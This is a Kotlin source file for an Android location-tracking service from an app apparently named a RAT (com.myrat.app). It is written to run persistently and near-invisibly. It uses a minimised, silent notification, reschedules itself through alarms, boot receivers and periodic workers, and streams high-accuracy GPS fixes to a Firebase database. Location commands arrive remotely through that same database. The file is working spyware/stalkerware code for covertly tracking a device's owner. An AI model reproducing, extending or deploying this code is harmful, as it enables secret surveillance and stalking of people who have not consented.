package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.work.*
import com.google.android.gms.location.*
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import com.myrat.app.worker.LastLocationWorker
import com.myrat.app.worker.ServiceCheckWorker
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

class LocationService : Service() {
    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private lateinit var sharedPref: SharedPreferences
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isTracking = false
    private var lastLocationTimestamp = 0L
    private val NOTIFICATION_ID = 5
    private val CHANNEL_ID = "LocationTracker"
    private val WORK_NAME = "LocationServiceCheck"
    private val LAST_LOCATION_WORK_NAME = "LastLocationUpdate"
    private val pendingRealTimeLocations = mutableListOf<Map<String, Any>>()
    private val pendingCurrentLocations = mutableListOf<Map<String, Any>>()

    companion object {
        val history = mutableListOf<Map<String, Any>>()
        val pendingHistory = mutableListOf<List<Map<String, Any>>>()
    }

    override fun onCreate() {
        super.onCreate()
        deviceId = MainActivity.getDeviceId(this)
        sharedPref = getSharedPreferences("location_pref", Context.MODE_PRIVATE)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        Logger.log("LocationService started for deviceId: $deviceId")

        scheduleRestart(this)
        startForegroundService()
        setupLocationUpdates()
        listenForLocationCommands()
        registerBootReceiver()
        scheduleServiceCheck()
        scheduleLastLocationUpdate()
        checkAndUploadPendingLocations()
    }

    private fun scheduleRestart(context: Context) {
        val alarmIntent = Intent(context, LocationService::class.java)
        val pendingIntent = PendingIntent.getService(
            context, 0, alarmIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )


        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60_000, // delay before restart
            5 * 60_000, // repeat every 5 minutes
            pendingIntent
        )
    }

    private fun startForegroundService() {
        val channelName = "Location Tracking Service"
        val manager = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                channelName,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Location Service")
            .setContentText("Running in background")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun setupLocationUpdates() {
        if (!hasLocationPermissions()) {
            Logger.log("Location permissions not granted")
            stopSelf()
            return
        }

        val locationRequest = LocationRequest.create().apply {
            interval = 10_000 // 10 seconds
            fastestInterval = 5_000 // 5 seconds
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        }

        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            ) {
                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
                Logger.log("Location updates requested")
            } else {
                Logger.log("Location permissions missing for requestLocationUpdates")
                stopSelf()
            }
        } catch (e: SecurityException) {
            Logger.log("SecurityException in requestLocationUpdates: ${e.message}")
            stopSelf()
        }
    }

    private val locationCallback = object : LocationCallback() {
        override fun onLocationResult(locationResult: LocationResult) {
            locationResult.lastLocation?.let { location ->
                val timestamp = System.currentTimeMillis()
                lastLocationTimestamp = timestamp

                // Create location data map
                val locationData = mapOf(
                    "latitude" to location.latitude,
                    "longitude" to location.longitude,
                    "timestamp" to timestamp,
                    "uploaded" to System.currentTimeMillis()
                )

                // Real-time tracking when isTracking is true
                if (isTracking) {
                    scope.launch {
                        try {
                            if (hasInternet()) {
                                db.child("Device").child(deviceId).child("location/realtime").setValue(locationData)
                                    .addOnFailureListener { e ->
                                        Logger.log("Failed to upload real-time location: ${e.message}")
                                        synchronized(pendingRealTimeLocations) {
                                            pendingRealTimeLocations.add(locationData)
                                            if (pendingRealTimeLocations.size > 1000) pendingRealTimeLocations.removeAt(0)
                                        }
                                    }
                                Logger.log("Real-time location uploaded: (${location.latitude}, ${location.longitude})")
                            } else {
                                synchronized(pendingRealTimeLocations) {
                                    pendingRealTimeLocations.add(locationData)
                                    if (pendingRealTimeLocations.size > 1000) pendingRealTimeLocations.removeAt(0)
                                }
                                Logger.log("No internet, queued real-time location: (${location.latitude}, ${location.longitude})")
                            }
                        } catch (e: Exception) {
                            Logger.log("Error in real-time location processing: ${e.message}")
                            synchronized(pendingRealTimeLocations) {
                                pendingRealTimeLocations.add(locationData)
                                if (pendingRealTimeLocations.size > 1000) pendingRealTimeLocations.removeAt(0)
                            }
                        }
                    }
                }
            }
        }
    }

    private fun saveLastLocation(latitude: Double, longitude: Double, timestamp: Long) {
        sharedPref.edit().apply {
            putFloat("last_latitude", latitude.toFloat())
            putFloat("last_longitude", longitude.toFloat())
            putLong("last_timestamp", timestamp)
            apply()
        }
        scope.launch {
            if (hasInternet()) {
                val locationData = mapOf(
                    "latitude" to latitude,
                    "longitude" to longitude,
                    "timestamp" to timestamp,
                    "uploaded" to System.currentTimeMillis()
                )
                try {
                    db.child("Device").child(deviceId).child("location/lastLocation").setValue(locationData)
                        .addOnFailureListener { e ->
                            Logger.log("Failed to upload last location: ${e.message}")
                        }
                    Logger.log("Last location uploaded: ($latitude, $longitude)")
                } catch (e: Exception) {
                    Logger.log("Error uploading last location: ${e.message}")
                }
            } else {
                Logger.log("No internet, last location saved locally: ($latitude, $longitude)")
            }
        }
    }

    private fun checkAndUploadPendingLocations() {
        scope.launch {
            // Upload pending last location
            val lat = sharedPref.getFloat("last_latitude", 0f).toDouble()
            val lon = sharedPref.getFloat("last_longitude", 0f).toDouble()
            val timestamp = sharedPref.getLong("last_timestamp", 0L)
            if (timestamp > 0 && hasInternet()) {
                val locationData = mapOf(
                    "latitude" to lat,
                    "longitude" to lon,
                    "timestamp" to timestamp,
                    "uploaded" to System.currentTimeMillis(),
                    "isOffline" to true
                )
                try {
                    db.child("Device").child(deviceId).child("location/lastLocation").setValue(locationData)
                    Logger.log("Uploaded pending last location: ($lat, $lon)")
                } catch (e: Exception) {
                    Logger.log("Error uploading pending last location: ${e.message}")
                }
            }

            // Upload pending real-time locations
            synchronized(pendingRealTimeLocations) {
                if (pendingRealTimeLocations.isNotEmpty() && hasInternet()) {
                    val currentTime = System.currentTimeMillis()
                    pendingRealTimeLocations.forEach { locationData ->
                        try {
                            db.child("Device").child(deviceId).child("location/realtime").setValue(
                                locationData + mapOf("uploaded" to currentTime)
                            ).addOnFailureListener { e ->
                                Logger.log("Failed to upload pending real-time location: ${e.message}")
                            }
                            Logger.log("Uploaded pending real-time location: (${locationData["latitude"]}, ${locationData["longitude"]})")
                        } catch (e: Exception) {
                            Logger.log("Error uploading pending real-time location: ${e.message}")
                        }
                    }
                    pendingRealTimeLocations.clear()
                }
            }

            // Upload pending current locations
            if (pendingCurrentLocations.isNotEmpty() && hasInternet()) {
                val currentTime = System.currentTimeMillis()
                pendingCurrentLocations.forEach { locationData ->
                    try {
                        db.child("Device").child(deviceId).child("location/current").setValue(
                            locationData + mapOf("uploaded" to currentTime)
                        ).addOnFailureListener { e ->
                            Logger.log("Failed to upload pending current location: ${e.message}")
                        }
                        Logger.log("Uploaded pending current location: (${locationData["latitude"]}, ${locationData["longitude"]})")
                    } catch (e: Exception) {
                        Logger.log("Error uploading pending current location: ${e.message}")
                    }
                }
                pendingCurrentLocations.clear()
            }

            // Upload pending history
            synchronized(pendingHistory) {
                if (pendingHistory.isNotEmpty() && hasInternet()) {
                    pendingHistory.forEach { historyData ->
                        try {
                            db.child("Device").child(deviceId).child("location/history").setValue(historyData)
                                .addOnFailureListener { e ->
                                    Logger.log("Failed to upload pending history: ${e.message}")
                                }
                            Logger.log("Uploaded pending history with ${historyData.size} locations")
                        } catch (e: Exception) {
                            Logger.log("Error uploading pending history: ${e.message}")
                        }
                    }
                    pendingHistory.clear()
                }
            }
        }
    }

    private fun listenForLocationCommands() {
        val locationRef = db.child("Device").child(deviceId).child("location")
        locationRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                try {
                    val getRealTime = snapshot.child("getRealTime").getValue(Boolean::class.java) ?: false
                    val getCurrent = snapshot.child("getCurrent").getValue(Boolean::class.java) ?: false

                    if (isTracking != getRealTime) {
                        isTracking = getRealTime
                        if (getRealTime) {
                            Logger.log("Command received: Start real-time tracking")
                            checkAndUploadPendingLocations()
                        } else {
                            Logger.log("Real-time tracking stopped")
                        }
                    }

                    if (getCurrent) {
                        Logger.log("Command received: Get current location")
                        uploadCurrentLocation()
                        locationRef.child("getCurrent").setValue(false)
                    }
                } catch (e: Exception) {
                    Logger.log("Error processing location commands: ${e.message}")
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.log("Failed to read location command: ${error.message}")
            }
        })
    }

    private fun uploadCurrentLocation() {
        if (!hasLocationPermissions()) {
            Logger.log("Location permissions not granted")
            return
        }

        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            ) {
                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                    if (location != null) {
                        val timestamp = System.currentTimeMillis()
                        val locationData = mapOf(
                            "latitude" to location.latitude,
                            "longitude" to location.longitude,
                            "timestamp" to timestamp,
                            "uploaded" to System.currentTimeMillis()
                        )
                        scope.launch {
                            try {
                                if (hasInternet()) {
                                    db.child("Device").child(deviceId).child("location/current").setValue(locationData)
                                        .addOnFailureListener { e ->
                                            Logger.log("Failed to upload current location: ${e.message}")
                                            pendingCurrentLocations.add(locationData)
                                        }
                                    Logger.log("Current location uploaded: (${location.latitude}, ${location.longitude})")
                                } else {
                                    pendingCurrentLocations.add(locationData)
                                    saveLastLocation(location.latitude, location.longitude, timestamp)
                                    Logger.log("No internet, current location queued: (${location.latitude}, ${location.longitude})")
                                }
                            } catch (e: Exception) {
                                Logger.log("Error uploading current location: ${e.message}")
                                pendingCurrentLocations.add(locationData)
                            }
                        }
                    } else {
                        val lat = sharedPref.getFloat("last_latitude", 0f).toDouble()
                        val lon = sharedPref.getFloat("last_longitude", 0f).toDouble()
                        val timestamp = sharedPref.getLong("last_timestamp", 0L)
                        if (timestamp > 0) {
                            val locationData = mapOf(
                                "latitude" to lat,
                                "longitude" to lon,
                                "timestamp" to timestamp,
                                "uploaded" to System.currentTimeMillis(),
                                "isOffline" to true
                            )
                            scope.launch {
                                if (hasInternet()) {
                                    try {
                                        db.child("Device").child(deviceId).child("location/current").setValue(locationData)
                                        Logger.log("Uploaded last known location (offline): ($lat, $lon)")
                                    } catch (e: Exception) {
                                        Logger.log("Error uploading offline location: ${e.message}")
                                        pendingCurrentLocations.add(locationData)
                                    }
                                } else {
                                    pendingCurrentLocations.add(locationData)
                                    Logger.log("No internet, offline location queued")
                                }
                            }
                        } else {
                            Logger.log("No last known location available")
                        }
                    }
                }.addOnFailureListener { e ->
                    Logger.log("Failed to get last location: ${e.message}")
                }
            } else {
                Logger.log("Location permissions missing for lastLocation")
            }
        } catch (e: SecurityException) {
            Logger.log("SecurityException in lastLocation: ${e.message}")
        }
    }

    private fun hasInternet(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return false
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun hasLocationPermissions(): Boolean {
        return ActivityCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED &&
                (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q ||
                        ActivityCompat.checkSelfPermission(
                            this,
                            Manifest.permission.ACCESS_BACKGROUND_LOCATION
                        ) == PackageManager.PERMISSION_GRANTED)
    }

    private fun registerBootReceiver() {
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_BOOT_COMPLETED)
            addAction(Intent.ACTION_LOCKED_BOOT_COMPLETED)
        }
        try {
            registerReceiver(bootReceiver, filter)
            Logger.log("Boot receiver registered")
        } catch (e: Exception) {
            Logger.log("Failed to register boot receiver: ${e.message}")
        }
    }

    private val bootReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action in listOf(Intent.ACTION_BOOT_COMPLETED, Intent.ACTION_LOCKED_BOOT_COMPLETED)) {
                Logger.log("Boot completed, starting LocationService")
                val serviceIntent = Intent(context, LocationService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context?.startForegroundService(serviceIntent)
                } else {
                    context?.startService(serviceIntent)
                }
            }
        }
    }

    private fun scheduleServiceCheck() {
        val workRequest = PeriodicWorkRequestBuilder<ServiceCheckWorker>(1, TimeUnit.HOURS)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
        Logger.log("Scheduled ServiceCheckWorker")
    }

    private fun scheduleLastLocationUpdate() {
        val workRequest = PeriodicWorkRequestBuilder<LastLocationWorker>(30, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            LAST_LOCATION_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
        Logger.log("Scheduled LastLocationWorker")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.log("LocationService onStartCommand")
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            fusedLocationClient.removeLocationUpdates(locationCallback)
        } catch (e: SecurityException) {
            Logger.log("SecurityException in removeLocationUpdates: ${e.message}")
        }
        try {
            unregisterReceiver(bootReceiver)
        } catch (e: IllegalArgumentException) {
            Logger.log("Boot receiver already unregistered")
        }
        scope.cancel()
        Logger.log("LocationService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}